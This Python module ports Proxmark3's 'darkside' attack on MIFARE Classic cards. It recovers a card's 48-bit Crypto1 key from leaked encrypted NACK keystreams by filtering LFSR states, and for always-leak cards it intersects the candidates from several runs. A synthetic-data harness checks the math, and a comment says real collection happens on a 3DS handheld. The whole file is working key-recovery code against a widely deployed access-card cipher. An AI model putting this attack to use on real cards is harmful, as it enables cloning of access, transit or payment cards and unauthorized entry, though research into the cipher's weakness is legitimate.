#!/usr/bin/env python3
"""Darkside (common-prefix / NACK-bug) key recovery, a port of pm3's lfsr_common_prefix +
nonce2key (common/crapto1/crapto1.c, client/src/mifare/mfkey.c).

The card leaks a 4-bit encrypted NACK when the reader's {nr}{ar} parity is wrong. With the tag
nonce nt held fixed and only the top 3 bits of the last nr byte varied (nt_diff 0..7), the 8
NACK keystreams ks[0..7] pin down the cipher's partial state after nt was fed, from which the
key follows. "Always leak NACK" cards answer regardless of parity (par_info == 0): one run then
yields a large candidate list, and the key is the one common to several runs (intersection).

This module is the Python proof of the recovery math; the collection is done on-chip (the 3DS
can't time auths finely enough from the host). Validated here against synthetic data from a
known key (no hardware), including the par_info == 0 multi-run intersection path.
"""
import sys

from crypto1 import Crypto1, filter_bit, prng_successor, _parity, _bit
from crapto1 import lfsr_rollback_bit, lfsr_rollback_word, crypto1_get_lfsr, M32

# crapto1's fast-forward tables: fastfwd[isodd][c] jumps a 21-bit half-state by the cipher's
# advance over nt_diff = c (the 5 fixed prefix bits plus c << 5, rolled through the filter).
FASTFWD = [
    [0, 0x4BC53, 0x0ECB1, 0x450E2, 0x25E29, 0x6E27A, 0x2B298, 0x60ECB],  # even (isodd = 0)
    [0, 0x1D962, 0x4BC53, 0x56531, 0x0ECB1, 0x135D3, 0x450E2, 0x58980],  # odd  (isodd = 1)
]


def lfsr_prefix_ks(ks, isodd):
    """21-bit partial states consistent with the 8 observed NACK keystreams (one LFSR half)."""
    out = []
    for i in range(1 << 21):
        good = True
        for c in range(8):
            entry = i ^ FASTFWD[isodd][c]
            if _bit(ks[c], isodd) != filter_bit(entry >> 1):
                good = False
                break
            if _bit(ks[c], isodd + 2) != filter_bit(entry):
                good = False
                break
        if good:
            out.append(i)
    return out


def _check_pfx_parity(prefix, rresp, par, odd, even, no_par):
    """pm3 check_pfx_parity: for each candidate (odd, even) advanced to nt_diff = c, roll back to
    the post-nt state and (unless no_par) keep only states whose parity bits match. Returns the
    post-nt [odd, even] state, or None."""
    good = True
    s = None
    for c in range(8):
        s = [(odd ^ FASTFWD[1][c]) & M32, (even ^ FASTFWD[0][c]) & M32]
        lfsr_rollback_bit(s, 0, 0)
        lfsr_rollback_bit(s, 0, 0)
        ks3 = lfsr_rollback_bit(s, 0, 0)
        ks2 = lfsr_rollback_word(s, 0, 0)
        ks1 = lfsr_rollback_word(s, prefix | (c << 5), 1)
        if no_par:
            break
        nr = ks1 ^ (prefix | (c << 5))
        rr = ks2 ^ rresp
        good &= 0 == (_parity(nr & 0x000000ff) ^ par[c][3] ^ _bit(ks2, 24))
        good &= 0 == (_parity(rr & 0xff000000) ^ par[c][4] ^ _bit(ks2, 16))
        good &= 0 == (_parity(rr & 0x00ff0000) ^ par[c][5] ^ _bit(ks2, 8))
        good &= 0 == (_parity(rr & 0x0000ff00) ^ par[c][6] ^ _bit(ks2, 0))
        good &= 0 == (_parity(rr & 0x000000ff) ^ par[c][7] ^ ks3)
        if not good:
            return None
    return s


def lfsr_common_prefix(pfx, rr, ks, par, no_par):
    """Candidate post-nt [odd, even] states for the common-prefix attack."""
    odd = lfsr_prefix_ks(ks, 1)
    even = lfsr_prefix_ks(ks, 0)
    states = []
    for o0 in odd:
        for e0 in even:
            o = o0
            e = e0
            for top in range(64):
                o = (o + (1 << 21)) & M32
                e = (e + (((0 if top & 7 else 1) + 1) << 21)) & M32
                s = _check_pfx_parity(pfx, rr, par, o, e, no_par)
                if s is not None:
                    states.append(s)
    return states


def dist_nt(nt1, nt2):
    """Nonce distance in PRNG steps (pm3 dist_nt): +i if nt2 = prng_successor^i(nt1), -i the other
    way, None if neither is within half a period (unrelated nonces)."""
    if nt1 == nt2:
        return 0
    a, b = nt1, nt2
    for i in range(1, 32768):
        a = prng_successor(a, 1)
        if a == nt2:
            return i
        b = prng_successor(b, 1)
        if b == nt1:
            return -i
    return None


def nonce2key(uid, nt, nr, ar, par_info, ks_info):
    """pm3 nonce2key: unpack (par_info, ks_info), run the common-prefix attack, roll each state
    back over uid ^ nt, and return the list of 48-bit key candidates."""
    nr &= 0xFFFFFF1F
    ks3x = [0] * 8
    par = [[0] * 8 for _ in range(8)]
    for pos in range(8):
        ks3x[7 - pos] = (ks_info >> (pos * 8)) & 0x0F
        bt = (par_info >> (pos * 8)) & 0xFF
        for b in range(8):
            par[7 - pos][b] = (bt >> b) & 1
    states = lfsr_common_prefix(nr, ar, ks3x, par, par_info == 0)
    keys = []
    for s in states:
        lfsr_rollback_word(s, uid ^ nt, 0)
        keys.append(crypto1_get_lfsr(s[0], s[1]))
    return keys


# --- synthetic data (proof only): what the on-chip collector will hand nonce2key -------------

def collect_synthetic(key, uid, nt, nr_prefix):
    """Emulate a darkside run against a known key: fixed nt, nr prefix with the last 3 bits
    swept, returning (nr, ar, par_info, ks_info) as nonce2key wants them. Parity is computed
    truthfully but folded into par_info only for the with-parity check; the always-leak path
    passes par_info = 0."""
    k = key.to_bytes(6, "big")
    ar = 0x11223344                          # fixed on-wire reader response (keyless reader)
    nr = nr_prefix & 0xFFFFFF1F
    ks_info = 0
    par_info = 0
    for c in range(8):
        nrc = nr | (c << 5)
        cc = Crypto1(k)
        cc.word(uid ^ nt)
        pbits = []
        for b in nrc.to_bytes(4, "big"):
            cc.byte(b, encrypted=True)       # nr: fixed on-wire byte, feedback = wire ^ ks
            pbits.append(cc.peek() ^ (1 ^ _parity(b)))
        for b in ar.to_bytes(4, "big"):
            cc.byte(0)                       # ar region: input 0, keystream only
            pbits.append(cc.peek() ^ (1 ^ _parity(b)))
        ks = sum(cc.bit() << i for i in range(4))  # 4-bit NACK keystream
        ks_info |= ks << ((7 - c) * 8)
        bt = 0
        for b in range(8):
            bt |= pbits[b] << b
        par_info |= bt << ((7 - c) * 8)
    return nr, ar, par_info, ks_info


def main():
    """Proof of the always-leak (par_info = 0) path: each run's candidate list is large, and the
    key is the one common to every run. This is exactly what the on-chip collector feeds: per run
    a locked nt and the 8 NACK keystreams for the fixed on-wire nr; the host intersects."""
    import time
    key = int(sys.argv[1], 16) if len(sys.argv) > 1 else 0xFFFFFFFFFFFF
    uid = 0x7991086F
    print(f"target key {key:012X}, uid {uid:08X}")

    common = None
    for r, nt in enumerate((0x1234ABCD, 0x55AA33CC, 0x0BADF00D, 0x13572468)):
        t = time.time()
        nr, ar, _, ks_info = collect_synthetic(key, uid, nt, 0xAABBCC00)
        ks = set(nonce2key(uid, nt, nr, ar, 0, ks_info))
        common = ks if common is None else (common & ks)
        print(f"  run {r}: nt {nt:08X}, {len(ks)} cands, intersection {len(common)}, "
              f"{time.time() - t:.1f}s")
        if len(common) == 1:
            break
    print(f"always-leak: key present in intersection: {key in (common or set())}, "
          f"final size {len(common or set())}")


if __name__ == "__main__":
    main()
